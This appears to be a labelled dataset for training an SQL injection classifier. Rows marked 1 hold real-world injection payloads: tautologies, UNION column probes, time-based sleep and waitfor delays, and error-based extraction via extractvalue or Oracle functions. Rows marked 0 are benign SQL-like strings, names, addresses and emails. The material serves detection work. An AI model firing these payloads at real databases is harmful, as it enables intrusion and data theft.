payload	label
87811832v	0
SELECT map FROM will UNION ALL SELECT accurate FROM wrapped ORDER BY grew	0
   SELECT COUNT ( sea ) , gasoline FROM fine BY kept	0
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1"	1
c/ clivia, 1, 1?d	0
SELECT * FROM liquid ORDER BY pond	0
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ugtw""  =  ""ugtw"	1
  UPDATE occur SET swung =  'crack', City =  'tonight' WHERE disease =  building	0
   SELECT toward, type, flag FROM idea WHERE dinner  IS NULL	0
zahnley	0
SELECT peace ( s )  FROM aware UNION ALL	0
cabot camaran	0
-1157   )    )    as sxie where 7118  =  7118 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --	1
SELECT * FROM chart WHERE inch BETWEEN never09/01/1996mean AND done15/31/1996noise	0
plaa del mercat, 198 7-c	0
azuqueca de henares	0
"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
SELECT headed ( s )  FROM threw FULL OUTER JOIN	0
wicht	0
hi' or 'a'  =  'a	1
-7469  )   where 5875  =  5875 or make_set  (  9354  =  9354,7185  )  --	1
2399	0
SELECT graph ( s )  FROM many SELECT properly ( s ) 	0
SELECT TOP 50 PERCENT * FROM magnet	0
SELECT * FROM verb  WHERE forgot NOT LIKE '[arrow]%'	0
polvo	0
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1"	1
-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab	1
   SELECT guide, wonder, brief FROM lift WHERE outline  IS NULL	0
-3960' or 9323  =  9323#	1
"1"" where 7022  =  7022"	1
4or3554e0a	0
purpurania, 79 3?b	0
6210300000000000	0
  SELECT bicycle AS lion, mood AS [toward]  FROM naturally	0
1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--	1
SELECT AVG ( noon ) FROM finger	0
-9509'  )   where 9303  =  9303 order by 1#	1
65223156d	0
SELECT * FROM molecular WHERE    NOT put = 'nest'	0
knyht9@aspirantes.lt	0
"-2717"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"	1
zimmerer	0
1' union all select null--	1
-8465' where 5242  =  5242 or 3806  =  7423--	1
"1""   )    )    as qejm where 9014  =  9014 union all select null,null,null,null,null,null#"	1
"1""  )   as nyui where 2511  =  2511"	1
"SELECT LPAD ( ""SQL Tutorial"",   20, ""ABC"" ) ;"	0
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
braschi_courtneidge@djbroadcast.an	0
   SELECT pig, obtain, rising FROM according WHERE excited  IS NULL	0
reilly-pidgeon@interpretacion-diccionario-y-significado-de-los-s	0
urkiaga	0
"1""   )    )    as sqow where 8752  =  8752"	1
SELECT ID, post_title, post_name FROM wp_posts WHERE post_type  =  'wpcf7_contact_form'	0
eward	0
25585710g	0
SELECT * FROM everyone FETCH FIRST 50 PERCENT ROWS ONLY	0
garner3	0
euzaine@schnapps.com.gs	0
1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'	1
1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ibav'  =  'ibav	1
5296	0
SELECT * FROM result ORDER BY moving DESC	0
1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  	1
fauno	0
atuesta venturi	0
englert	0
1' waitfor delay '0:0:5'	1
-9356 or elt  (  1032  =  1032,3623  )  -- izgi	1
calle puerto de alcolea 185 9-e	0
calle sobrerroca 96, 7?f	0
SELECT COUNT ( DISTINCT shout )  FROM sky	0
SELECT AVG ( prize )  FROM bad  SELECT SUM ( quarter ) 	0
tres villas, las	0
-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#	1
19583	0
SELECT * FROM complex WHERE blue NOT LIKE 'outline%'	0
1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989	1
 or 1  =  1 /*	1
DELETE FROM door WHERE grow = 'small'	0
9334	0
"1"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""xqgt"" like ""xqgt"	1
-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '	1
  SELECT discuss,heart,leaf FROM quickly LEFT JOIN Orders ON map.somehowID =  unless.finish ORDER BY very.create	0
1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi	1
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare	1
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve	0
1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#	1
79039106c	0
1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz	1
1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '	1
cardenal mendoza s/n, 7?h	0
SELECT TOP 3 * FROM before	0
-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  	1
calle sant joan, 123,	0
SELECT TOP 50 PERCENT * FROM ill	0
SELECT * FROM foot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM children	0
 )    )    or pg_sleep  (  __TIME__  )  --	1
alfa71ta	0
volkmann_parfrey1@sigloventidos.be	0
"-7884"" where 3297  =  3297 or 2492  =  6158"	1
SELECT AVG ( horn ) FROM until SELECT SUM ( typical ) 	0
-9358' or 9887  =  2569--	1
1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
SELECT doing ( s )  FROM general UNION ALL	0
SELECT AVG ( first ) FROM compass SELECT SUM ( chair ) 	0
SELECT COUNT ( him ) FROM doing	0
50690	0
SELECT * FROM fix WHERE include = 'environment'  OR industrial = 'wise'	0
calahorra, la	0
"-7138"" union all select 2341,2341,2341,2341--"	1
valverde de valdelacasa	0
calle platerias, 47	0
SELECT * FROM pencil WHERE wheel IN  ( SELECT city FROM life ) 	0
1%' union all select null--	1
   SELECT shot,bigger,needed,population,beyond     (  (  forth JOIN discuss ON thrown.number =  trouble.produce )   INNER JOIN indicateON Orders.arrive =  neck.unusualID ) 	0
passeig desert 180,	0
SELECT blank ( s ) FROM yard INNER JOIN	0
1%'   )    )     ) 	1
1'   )    )    as fwhv where 3921  =  3921 union all select null,null--	1
  UPDATE fun SET park =  'any', City =  'birth' WHERE twice =  sudden	0
SELECT AVG ( chapter ) FROM all SELECT SUM ( parallel ) 	0
 or '1'  =  '1	1
el-hawar	0
  SELECT mindID AS ID, burst AS grade FROM stock	0
SELECT * FROM greatest WHERE tank = 'grow'  AND City = 'upper'	0
1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'	1
   SELECT COUNT ( oil ) , throat FROM spend BY quite	0
   SELECT COUNT ( useful ) , express FROM merely BY tobacco	0
-4076'   )    )    union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--	1
albiol	0
INSERT INTO winter  ( dot, successful, tobacco )  VALUES  ( 'root', 'slide', 'flag' )  	0
SELECT AVG ( Price ) FROM egg	0
SELECT tool ( s )  FROM list SELECT exact ( s ) 	0
abaeto sanchon	0
-9522  )   as lraw where 9472  =  9472 or   (  4087  =  8213  )  *8213--	1
SELECT TOP 3 * FROM ring WHERE evening = 'south' SELECT * FROM brick	0
1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#	1
select   (  case when   (  5418  =  6516  )   then 1 else 5418*  (  select 5418 from master..sysdatabases  )   end  )  --	1
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  "	1
SELECT TOP 3 * FROM seldom WHERE fresh = 'piano'	0
"1""  )   as jtou where 8129  =  8129 and 7533  =  7533--"	1
6766	0
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #	1
SELECT * FROM ordinary WHERE although  BETWEEN 10 AND 20	0
1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp	1
olrich-shapiro1@nuriamartin.aw	0
pravia	0
shirleen	0
SELECT * FROM  ( SELECT care FROM yesterday ) 	0
1' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT TOP 3 * FROM foreign	0
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) 	1
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg"	1
SELECT * FROM Customers WHERE City  =  @City GO; EXEC SelectAllCustomers @City  =  'London'; CREATE PROCEDURE SelectAllCustomers @City nvarchar ( 30 ) , @PostalCode nvarchar ( 10 )  AS 	0
1' in boolean mode  )   union all select null,null,null,null,null#	1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) 	1
"-7514%""   )    )     )   or 2448  =  8797#"	1
"1""   )    )    union all select null,null--"	1
 UPDATE sugar SET please = 'first'WHERE mass = 'shirt'	0
SELECT * FROM look WHERE were = 'possible' LIMIT 3	0
"  SELECT SUBSTRING_INDEX ( ""www.w3schools.com"", ""."", 2 ) ;"	0
  SELECT taste AS zoo, black AS [form]  FROM musical	0
1'  )   as fyuh where 7608  =  7608 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
marketa	0
\x27UNION SELECT	1
1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   	1
amodeo sidany	0
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY	0
SELECT bow ( s )  FROM expect FULL OUTER JOIN	0
vital	0
  UPDATE feature SET white =  'or', City =  'cry' WHERE stay =  dream	0
pl. heroes de espaa 20 11?g	0
SELECT progress ( s )  FROM important SELECT clay FROM tell	0
camino del caliero, 75	0
SELECT came ( s )  FROM wild SELECT if FROM temperature	0
"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp"	1
-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563	1
SELECT AVG ( fresh ) FROM child	0
   SELECT transportation, older+ ', ' + traffic+ ' ' + surprise+ ', ' + simple AS quietly  FROM full	0
vallb remesar	0
-9840'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dzlp'  =  'dzlp	1
  SELECT equallyID AS ID, dance AS hang FROM duck	0
SELECT pattern ( s )  FROM whom	0
alpar-ornstein@rockefeller.nu	0
"1%""   )    )    and 7358  =  6986--"	1
acre	0
1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
-9774'   )    )     )   union all select 6954,6954,6954#	1
19119	0
SELECT * FROM body WHERE canal BETWEEN useful09/01/1996mind AND mountain15/31/1996thing	0
SELECT * FROM massage WHERE split = 'face' LIMIT 3	0
"1""   )    )    as uqem where 3521  =  3521"	1
"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#"	1
swaden	0
SELECT * FROM opinion WHERE second = 'crew' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM themselves 3 SELECT * FROM card	0
ribera d'ondara	0
8449	0
SELECT AVG ( Price ) FROM start	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i	1
1'   )    )     )   and 2006  =  2006	1
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh	1
"SELECT * FROM search WHERE tea BETWEEN ""struggle"" AND    ""fire"""	0
SELECT glass ( s )  FROM keep UNION	0
SELECT stems ( s FROM better RIGHT JOIN	0
SELECT eager ( s )  FROM crew FULL OUTER JOIN	0
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) 	1
SELECT TOP 3 * FROM to SELECT * FROM famous 3SELECT * FROM fellow	0
"1"" where 5977  =  5977"	1
7512210000000000	0
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd"	1
   SELECT Employees.furniture, COUNT ( Orders.otherID )  AS wellFROM    ( OrdersINNER JOIN judge ON Orders.spokenID  =  Employees.scienceID ) 	0
"1""   )    )    as drss where 2077  =  2077 and 7533  =  7533--"	1
INSERT INTO motor ( gasoline, something, single, because, below, announced )  VALUES  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  	0
15107	0
29640	0
SELECT jump ( s )  FROM cream SELECT audience ( s ) 	0
donadieu zanotti	0
SELECT * FROM put ORDER BY cowboy DESC	0
SELECT * FROM bread ORDER BY temperature DESC	0
SELECT MIN ( tower )  AS depth FROM most	0
1   )    )     )   union all select null#	1
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --"	1
SELECT * FROM slight WHERE indeed IN  ( SELECT hard FROM describe ) 	0
"-5579%""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """	1
SELECT * FROM product WHERE NOT closely = 'lion'  AND NOT far = 'sink'	0
"-4926"" where 8152  =  8152 or 4339  =  5547#"	1
weinberger@privatebanking.com.nz	0
7aria22	0
02054707w	0
SELECT highway ( s )  FROM clear UNION ALL	0
1'  )   as nmzp where 3794  =  3794 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
   SELECT plant,press,daughter,sand,connected     (  (  guard JOIN leader ON current.gradually =  better.silence )   INNER JOIN readerON Orders.young =  explain.parallelID ) 	0
"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--"	1
SELECT AVG ( whole ) FROM hurt	0
SELECT * FROM setting WHERE hearing BETWEEN angry09/01/1996pay AND such15/31/1996cold	0
1'  )   where 4277  =  4277 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
"1%""  )   union all select null,null,null,null,null,null#"	1
SELECT * FROM went WHERE slow BETWEEN aware09/01/1996exist AND route15/31/1996smaller	0
adams@11horas.ng	0
SELECT * FROM triangle FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM anybody	0
SELECT * FROM among WHERE popular = 'common'  AND  ( leather = 'friend' OR bent = 'somebody' ) 	0
"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """	1
SELECT AVG ( task ) FROM evening SELECT SUM ( heart ) 	0
  SELECT important AS add, particular AS [into]  FROM dull	0
martens@ajuntamentbarcelona2-0.tl	0
SELECT COUNT ( especiallyID ) FROM mud	0
patten	0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""hjxh""  =  ""hjxh"	1
6162510000000000	0
delito	0
SELECT spell ( s ) FROM else INNER JOIN	0
samm@lawn.sn	0
"SELECT * FROM behavior WHERE diagram BETWEEN ""sound"" AND    ""pile"""	0
"1%""   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
FROM  ( SELECT DISTINCT bare FROM although ) 	0
SELECT * FROM Customers WHERE City  =  @City AND PostalCode  =  @PostalCode GO;  EXEC SelectAllCustomers @City  =  'London', @PostalCode  =  'WA1 1DP';	0
du-tuan	0
SELECT * FROM function WHERE soft LIKE '%former%'	0
